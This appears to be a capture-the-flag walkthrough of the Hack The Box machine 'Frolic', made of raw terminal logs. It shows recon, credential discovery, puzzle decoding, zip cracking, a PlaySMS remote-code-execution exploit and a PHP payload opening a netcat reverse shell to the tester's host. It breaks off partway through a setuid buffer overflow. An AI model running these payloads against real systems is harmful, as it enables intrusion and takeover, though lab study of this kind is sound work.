RECON
root@kali:~/htb/frolic# nmap -sC -sV -p- -vv -oA  full 10.10.10.111
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3HUqxhCShF9I6uBmGCX6yXz56Iibv7WW2fBKsKA9yVqmoupPdDKac1U3/PIioRNHkPC03r5ZXsqfALwjIWEits7toO4K+9VSFU6d0qhmpUZW3WwiyxdcPxmTQLpU8InXZpMOwjpGJTTwqxsMIxNdPk0FP/MtqEzQI45MOr7IQOGcEAsmcJ1Cy3aRDAnp77NBWYA316l7Xb8WA/aWoHEyS/6Qf3XzeARf0yZ6YwYg4TTsaeQtfRr4HWZBDs7fLrrWUzN0ivb9izy9YgqrOJ5ZKQI4A1yn0CxZNsiweIT8gopM1KrfinPGiKbGbSNVvTX2dHYyISh6Y2bp1D5vum6SH
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDSjEcHeA/VoBi4PaoyxwM1Rx1vpoQofoJPYTxBuQLXRujf3gqn491cWpd2CDh2mF/3w2kEGsrWRwqD4LZmz+Sk=
|   256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINVT+d0lX5zwXTOY4h4+MfU6kt/q3EmGVWIXnMsomQq5
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        syn-ack ttl 63 Node.js (Express middleware)
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Node-RED
9999/tcp open  http        syn-ack ttl 63 nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h44m48s, deviation: 3h10m31s, median: 5m11s
| nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FROLIC<00>           Flags: <unique><active>
|   FROLIC<03>           Flags: <unique><active>
|   FROLIC<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40584/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 50509/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 36186/udp): CLEAN (Failed to receive data)
|   Check 4 (port 56754/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2020-11-29T18:04:07+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-29 07:34:07
|_  start_date: N/A


VULN SCAN

ENUM WEB
http://frolic.htb:9999/backup/
password.txt user.txt loop/ 

http://frolic.htb:9999/backup/user.txt
user - admin

http://frolic.htb:9999/backup/password.txt
password - imnothuman

http://frolic.htb:9999/admin/

LOGIN TO ADMIN PASSWORD FAILURE
http://frolic.htb:9999/admin/js/login.js
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}

DEEPER WEB ENUM
root@kali:~/htb/frolic# python3 /root/dirsearch/dirsearch.py -w /usr/share/wordlists/dirb/common.txt -r -R 3 -e "php,js,txt,html,css,png,config" -f -t 50 -u http://10.10.10.111:9999

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: php, js, txt, html, css, png, config | HTTP method: GET | Threads: 50 | Wordlist size: 41499

Error Log: /root/dirsearch/logs/errors-20-11-29_13-20-10.log

Target: http://10.10.10.111:9999/

Output File: /root/dirsearch/reports/10.10.10.111/_20-11-29_13-20-10.txt

[13:20:10] Starting: 
[13:20:11] 403 -  580B  - //.hta.js
[13:20:11] 403 -  580B  - //.hta.txt
[13:20:11] 403 -  580B  - //.hta.html
[13:20:11] 403 -  580B  - //.hta.css
[13:20:11] 403 -  580B  - //.hta.png
[13:20:11] 403 -  580B  - //.hta.config
[13:20:11] 403 -  580B  - //.hta/     (Added to queue)
[13:20:11] 403 -  580B  - //.htaccess.css
[13:20:11] 403 -  580B  - //.htaccess.js
[13:20:11] 403 -  580B  - //.htaccess.png
[13:20:11] 403 -  580B  - //.htpasswd.txt
[13:20:11] 403 -  580B  - //.htpasswd.css
[13:20:11] 403 -  580B  - //.htpasswd.js
[13:20:11] 403 -  580B  - //.htaccess.config
[13:20:11] 403 -  580B  - //.htpasswd.html
[13:20:11] 403 -  580B  - //.htpasswd.config
[13:20:11] 403 -  580B  - //.htpasswd.png
[13:20:11] 403 -  580B  - //.htaccess.html
[13:20:15] 301 -  194B  - //admin  ->  http://10.10.10.111:9999/admin/     (Added to queue)
[13:20:15] 200 -  634B  - //admin/
[13:20:19] 200 -   28B  - //backup/     (Added to queue)
[13:20:19] 301 -  194B  - //backup  ->  http://10.10.10.111:9999/backup/
[13:20:31] 301 -  194B  - //dev  ->  http://10.10.10.111:9999/dev/     (Added to queue)
[13:20:31] 403 -  580B  - //dev/
[13:21:24] 301 -  194B  - //test  ->  http://10.10.10.111:9999/test/     (Added to queue)
[13:21:24] 200 -   83KB - //test/
[13:21:34] Starting: .hta/
[13:22:40] 403 -  580B  - //.hta/php
[13:23:16] Starting: admin/
[13:23:17] 403 -  580B  - //admin/.hta.html
[13:23:17] 403 -  580B  - //admin/.hta.config
[13:23:17] 403 -  580B  - //admin/.hta.png
[13:23:17] 403 -  580B  - //admin/.hta/     (Added to queue)
[13:23:17] 403 -  580B  - //admin/.hta.css
[13:23:17] 403 -  580B  - //admin/.htaccess.html
[13:23:17] 403 -  580B  - //admin/.htaccess.js
[13:23:17] 403 -  580B  - //admin/.htpasswd.config
[13:23:17] 403 -  580B  - //admin/.htaccess.config
[13:23:17] 403 -  580B  - //admin/.htpasswd.js
[13:23:17] 403 -  580B  - //admin/.htaccess.css
[13:23:17] 403 -  580B  - //admin/.htaccess.png
[13:23:17] 403 -  580B  - //admin/.htpasswd.txt
[13:23:17] 403 -  580B  - //admin/.htpasswd.css
[13:23:17] 403 -  580B  - //admin/.htpasswd.html
[13:23:17] 403 -  580B  - //admin/.htpasswd.png
[13:23:17] 403 -  580B  - //admin/.hta.js
[13:23:17] 403 -  580B  - //admin/.hta.txt
[13:23:38] 301 -  194B  - //admin/css  ->  http://10.10.10.111:9999/admin/css/     (Added to queue)
[13:23:38] 403 -  580B  - //admin/css/
[13:23:53] 200 -  634B  - //admin/index.html
[13:23:55] 403 -  580B  - //admin/js/     (Added to queue)
[13:23:56] 301 -  194B  - //admin/js  ->  http://10.10.10.111:9999/admin/js/
[13:24:28] 200 -    1KB - //admin/success.html
[13:24:46] Starting: backup/
[13:24:47] 403 -  580B  - //backup/.hta.html
[13:24:47] 403 -  580B  - //backup/.hta.js
[13:24:47] 403 -  580B  - //backup/.hta.txt
[13:24:47] 403 -  580B  - //backup/.hta.png
[13:24:47] 403 -  580B  - //backup/.hta.config
[13:24:47] 403 -  580B  - //backup/.hta/     (Added to queue)
[13:24:47] 403 -  580B  - //backup/.hta.css
[13:24:47] 403 -  580B  - //backup/.htaccess.js
[13:24:47] 403 -  580B  - //backup/.htaccess.png
[13:24:47] 403 -  580B  - //backup/.htaccess.css
[13:24:47] 403 -  580B  - //backup/.htpasswd.txt
[13:24:47] 403 -  580B  - //backup/.htpasswd.html
[13:24:47] 403 -  580B  - //backup/.htaccess.config
[13:24:47] 403 -  580B  - //backup/.htpasswd.config
[13:24:47] 403 -  580B  - //backup/.htaccess.html
[13:24:47] 403 -  580B  - //backup/.htpasswd.css
[13:24:47] 403 -  580B  - //backup/.htpasswd.js
[13:24:47] 403 -  580B  - //backup/.htpasswd.png
[13:25:24] 200 -   28B  - //backup/index.php
[13:25:38] 200 -   22B  - //backup/password.txt
[13:26:05] 200 -   13B  - //backup/user.txt
[13:26:11] Starting: dev/
[13:26:12] 403 -  580B  - //dev/.hta/     (Added to queue)
[13:26:12] 403 -  580B  - //dev/.hta.js
[13:26:12] 403 -  580B  - //dev/.htaccess.js
[13:26:12] 403 -  580B  - //dev/.hta.png
[13:26:12] 403 -  580B  - //dev/.hta.html
[13:26:12] 403 -  580B  - //dev/.hta.css
[13:26:12] 403 -  580B  - //dev/.htaccess.png
[13:26:12] 403 -  580B  - //dev/.hta.config
[13:26:12] 403 -  580B  - //dev/.htaccess.html
[13:26:12] 403 -  580B  - //dev/.hta.txt
[13:26:12] 403 -  580B  - //dev/.htaccess.config
[13:26:12] 403 -  580B  - //dev/.htaccess.css
[13:26:12] 403 -  580B  - //dev/.htpasswd.css
[13:26:12] 403 -  580B  - //dev/.htpasswd.png
[13:26:12] 403 -  580B  - //dev/.htpasswd.config
[13:26:12] 403 -  580B  - //dev/.htpasswd.txt
[13:26:12] 403 -  580B  - //dev/.htpasswd.html
[13:26:12] 403 -  580B  - //dev/.htpasswd.js
[13:26:22] 301 -  194B  - //dev/backup  ->  http://10.10.10.111:9999/dev/backup/     (Added to queue)
[13:26:23] 200 -   11B  - //dev/backup/
[13:27:27] 200 -    5B  - //dev/test
[13:27:38] Starting: test/
[13:27:39] 403 -  580B  - //test/.hta.js
[13:27:39] 403 -  580B  - //test/.hta/     (Added to queue)
[13:27:39] 403 -  580B  - //test/.htaccess.png
[13:27:39] 403 -  580B  - //test/.htaccess.js
[13:27:39] 403 -  580B  - //test/.htaccess.html
[13:27:39] 403 -  580B  - //test/.hta.css
[13:27:39] 403 -  580B  - //test/.hta.txt
[13:27:39] 403 -  580B  - //test/.htaccess.config
[13:27:39] 403 -  580B  - //test/.hta.png
[13:27:39] 403 -  580B  - //test/.htpasswd.html
[13:27:39] 403 -  580B  - //test/.htaccess.css
[13:27:39] 403 -  580B  - //test/.hta.html
[13:27:39] 403 -  580B  - //test/.htpasswd.js
[13:27:39] 403 -  580B  - //test/.hta.config
[13:27:39] 403 -  580B  - //test/.htpasswd.css
[13:27:39] 403 -  580B  - //test/.htpasswd.png
[13:27:39] 403 -  580B  - //test/.htpasswd.txt
[13:27:39] 403 -  580B  - //test/.htpasswd.config
[13:28:23] 200 -   83KB - //test/index.php
[13:29:12] Starting: admin/.hta/
[13:30:18] 403 -  580B  - //admin/.hta/php
[13:30:57] Starting: admin/css/
[13:30:58] 403 -  580B  - //admin/css/.hta.html
[13:30:58] 403 -  580B  - //admin/css/.htaccess.js
[13:30:58] 403 -  580B  - //admin/css/.htaccess.html
[13:30:58] 403 -  580B  - //admin/css/.hta/     (Added to queue)
[13:30:58] 403 -  580B  - //admin/css/.htaccess.png
[13:30:58] 403 -  580B  - //admin/css/.htpasswd.txt
[13:30:58] 403 -  580B  - //admin/css/.htpasswd.html
[13:30:58] 403 -  580B  - //admin/css/.hta.txt
[13:30:58] 403 -  580B  - //admin/css/.htaccess.config
[13:30:58] 403 -  580B  - //admin/css/.htaccess.css
[13:30:58] 403 -  580B  - //admin/css/.htpasswd.js
[13:30:58] 403 -  580B  - //admin/css/.htpasswd.png
[13:30:58] 403 -  580B  - //admin/css/.hta.css
[13:30:58] 403 -  580B  - //admin/css/.hta.config
[13:30:58] 403 -  580B  - //admin/css/.hta.png
[13:30:58] 403 -  580B  - //admin/css/.hta.js
[13:30:58] 403 -  580B  - //admin/css/.htpasswd.css
[13:30:58] 403 -  580B  - //admin/css/.htpasswd.config
[13:32:20] 200 -    1KB - //admin/css/style.css
[13:32:36] Starting: admin/js/
[13:32:37] 403 -  580B  - //admin/js/.hta.txt
[13:32:37] 403 -  580B  - //admin/js/.hta.html
[13:32:37] 403 -  580B  - //admin/js/.hta.js
[13:32:37] 403 -  580B  - //admin/js/.hta.css
[13:32:37] 403 -  580B  - //admin/js/.hta.png
[13:32:37] 403 -  580B  - //admin/js/.hta.config
[13:32:37] 403 -  580B  - //admin/js/.hta/     (Added to queue)
[13:32:37] 403 -  580B  - //admin/js/.htpasswd.config
[13:32:37] 403 -  580B  - //admin/js/.htpasswd.css
[13:32:37] 403 -  580B  - //admin/js/.htpasswd.png
[13:32:37] 403 -  580B  - //admin/js/.htaccess.js
[13:32:37] 403 -  580B  - //admin/js/.htaccess.config
[13:32:37] 403 -  580B  - //admin/js/.htaccess.html
[13:32:37] 403 -  580B  - //admin/js/.htpasswd.txt
[13:32:37] 403 -  580B  - //admin/js/.htaccess.png
[13:32:37] 403 -  580B  - //admin/js/.htaccess.css
[13:32:37] 403 -  580B  - //admin/js/.htpasswd.html
[13:32:37] 403 -  580B  - //admin/js/.htpasswd.js
[13:33:22] 200 -  752B  - //admin/js/login.js
[13:34:06] Starting: backup/.hta/
[13:35:19] 403 -  580B  - //backup/.hta/php
[13:36:01] Starting: dev/.hta/
[13:37:14] 403 -  580B  - //dev/.hta/php
[13:37:57] Starting: dev/backup/
[13:37:58] 403 -  580B  - //dev/backup/.hta.html
[13:37:58] 403 -  580B  - //dev/backup/.hta/     (Added to queue)
[13:37:58] 403 -  580B  - //dev/backup/.htaccess.html
[13:37:58] 403 -  580B  - //dev/backup/.hta.txt
[13:37:58] 403 -  580B  - //dev/backup/.hta.config
[13:37:58] 403 -  580B  - //dev/backup/.htaccess.js
[13:37:59] 403 -  580B  - //dev/backup/.htaccess.config
[13:37:59] 403 -  580B  - //dev/backup/.htpasswd.config
[13:37:59] 403 -  580B  - //dev/backup/.htpasswd.txt
[13:37:59] 403 -  580B  - //dev/backup/.htaccess.css
[13:37:59] 403 -  580B  - //dev/backup/.htpasswd.css
[13:37:59] 403 -  580B  - //dev/backup/.htpasswd.png
[13:37:59] 403 -  580B  - //dev/backup/.htpasswd.html
[13:37:59] 403 -  580B  - //dev/backup/.htpasswd.js
[13:37:59] 403 -  580B  - //dev/backup/.htaccess.png
[13:37:59] 403 -  580B  - //dev/backup/.hta.js
[13:37:59] 403 -  580B  - //dev/backup/.hta.css
[13:37:59] 403 -  580B  - //dev/backup/.hta.png
[13:38:44] 200 -   11B  - //dev/backup/index.php
[13:39:37] Starting: test/.hta/
[13:40:50] 403 -  580B  - //test/.hta/php
[13:41:34] Starting: admin/css/.hta/
[13:42:43] 403 -  580B  - //admin/css/.hta/php
[13:43:24] Starting: admin/js/.hta/
[13:44:36] 403 -  580B  - //admin/js/.hta/php
[13:45:17] Starting: dev/backup/.hta/
[13:46:27] 403 -  580B  - //dev/backup/.hta/php

LOGGING INTO ADMIN
user:admin
password:superduperlooperpassword_lol

http://frolic.htb:9999/admin/success.html
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
!!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
!.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
!!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
.?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
!.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
!!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
!.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
!!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
!!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
..!.! !!!!! !.?.

DECODE OOK CRYPTIC MESSAGE
https://www.dcode.fr/ook-language
Nothing here check /asdiSIAJJ0QWE9JAS

REVIEW NEW DIRECTORY
http://frolic.htb:9999/asdiSIAJJ0QWE9JAS/
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB
BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs
K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve
EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj
lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC
AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG
AAAAAAEAAQBPAAAAAwEAAAAA

DECRYPT BASE64 STRING
root@kali:~/htb/frolic# cat index.html | base64 -d > index.dec
root@kali:~/htb/frolic# file index.dec 
index.dec: Zip archive data, at least v2.0 to extract
root@kali:~/htb/frolic# cp index.dec index.zip
root@kali:~/htb/frolic# unzip index.zip
Archive:  index.zip
[index.zip] index.php password: 
password incorrect--reenter: 
   skipping: index.php               incorrect password

DECRYPT ZIP FILE
root@kali:~/htb/frolic# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt index.zip 


PASSWORD FOUND!!!!: pw == password

UNZIP THE FILE WITH THE PASSWORD
root@kali:~/htb/frolic# unzip index.zip 
Archive:  index.zip
[index.zip] index.php password: 
  inflating: index.php  

REVIEW THE INDEX PHP FILE
root@kali:~/htb/frolic# cat index.php 
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b797372504
63067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77
720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c543
4674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a7772
4b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b31736
74c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a786450
6973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674
c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a
776743673d3d0d0a

CONVERT HEX TO ASCII
root@kali:~/htb/frolic# cat index.php | xxd -r -p
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==

CONVERT BASE64 TO TEXT
root@kali:~/htb/frolic# echo -n KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg== | base64 -d
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..< 

TRANSLATE BRAINFUCK CODE TO TEXT
https://www.dcode.fr/brainfuck-language
idkwhatispass

LOGIN TO PLAYSMS WITH PASSWORD FROM BRAINFUCK CODE
http://10.10.10.111:9999/dev/backup/
/playsms 

admin
idkwhatispass

http://10.10.10.111:9999/playsms/index.php?app=main&inc=core_auth&route=login


SEARCH FOR PLAYSMS EXPLOIT
root@kali:~/htb/frolic# searchsploit playsms 1.4
---------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                  |  Path
                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unres | exploits/php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                | exploits/php/webapps/42044.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code | exploits/php/remote/44599.rb
PlaySMS 1.4 - Remote Code Execution                             | exploits/php/webapps/42038.txt
---------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

OR ON GITHUB EXPLOIT AVAILABLE
https://github.com/jasperla/CVE-2017-9101

GET LIMITED SHELL WITH PLAYSMS EXPLOIT
root@kali:~/htb/frolic# python3 playsmshell.py --url http://10.10.10.111:9999/playsms/ --password idkwhatispass -i
[*] Grabbing CSRF token for login
[*] Attempting to login as admin
[+] Logged in!
[*] Grabbing CSRF token for phonebook import
[+] Entering interactive shell; type "quit" or ^D to quit
> ls -l /home/sahay
total 0

> ls -l /home/ayush
total 4
-rwxr-xr-x 1 ayush ayush 33 Sep 25  2018 user.txt

> cat /home/ayush/user.txt
2ab95909cf509f85a6f476b59a0c2fe0

> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

> pwd
/var/www/html/playsms

OR VIA PLAYSMS PORTAL
http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list

CREATE PHP PAYLOAD WITH RCE
root@kali:~/htb/frolic# echo -ne 'Name,Mobile,Email\n<?php echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f") ?>,66,22' > rsh.csv

UPLOAD TO PLAYSMS PORTAL AND IMPORT
http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list

GET REVERSE SHELL
root@kali:~/htb/frolic# nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.8] from frolic.htb [10.10.10.111] 43544
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -ar
Linux frolic 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686 athlon i686 GNU/Linux
$ hostname
frolic

GET USER FLAG
$ cat /home/ayush/user.txt
#########################################

UPGRADE SHELL
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@frolic:~/html/playsms$ 

PRIVESC
$ ls -la /home/ayush/
total 36
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 .
drwxr-xr-x 4 root  root  4096 Sep 23  2018 ..
-rw------- 1 ayush ayush 2781 Sep 25  2018 .bash_history
-rw-r--r-- 1 ayush ayush  220 Sep 23  2018 .bash_logout
-rw-r--r-- 1 ayush ayush 3771 Sep 23  2018 .bashrc
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .binary
-rw-r--r-- 1 ayush ayush  655 Sep 23  2018 .profile
-rw------- 1 ayush ayush  965 Sep 25  2018 .viminfo
-rwxr-xr-x 1 ayush ayush   33 Sep 25  2018 user.txt
$ ls -la /home/ayush/.binary
total 16
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 ..
-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop


REVIEW ROP BINARY
$ file /home/ayush/.binary/rop
/home/ayush/.binary/rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped

RUN ROP BINARY
$ cd /home/ayush/.binary
$ ./rop
[*] Usage: program <message>
$ ./rop message4u
[+] Message sent: message4u$ 

BUFFER OVERFLOW IN ROP BINARY
$ ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)

ASLR CHECK IF DISABLED
$ cat /proc/sys/kernel/randomize_va_space
0

REVIEW ROP ON KALI
$ python -m SimpleHTTPServer
10.10.14.8 - - [30/Nov/2020 02:46:15] "GET /rop HTTP/1.1" 200 -

root@kali:~/htb/frolic# wget 10.10.10.111:8000/rop

REVIEW ROP WITH GDB
root@kali:~/htb/frolic# gdb -q rop
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.3.1 using Python engine 3.8
[*] 1 command could not be loaded, run `gef missing` to know why.
Reading symbols from rop...
(No debugging symbols found in rop)
gef➤  checksec
[+] checksec for '/root/frolic/rop'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial

(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /root/htb/frolic/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x62413762 in ?? ()

GET THE PATTERN OFFSET FOR ADDRESS AT SEGMENTATION FAULT
root@kali:~/htb/frolic# msf-pattern_offset -q 62413762
[*] Exact match at offset 52

TEST BUFFER OVERFLOW BY SENDING 52 BYTES OF JUNK(A) AND 4 BYTES FOR EIP value 
root@kali:~/htb/frolic# gdb rop
GNU gdb (Debian 8.1-4) 8.1
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /root/htb/frolic/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x62413762 in ?? ()
(gdb) run `python -c "print 'A'*52 + 'B'*4"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/htb/frolic/rop `python -c "print 'A'*52 + 'B'*4"`

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) break main
Breakpoint 1 at 0x80484aa
(gdb) print system
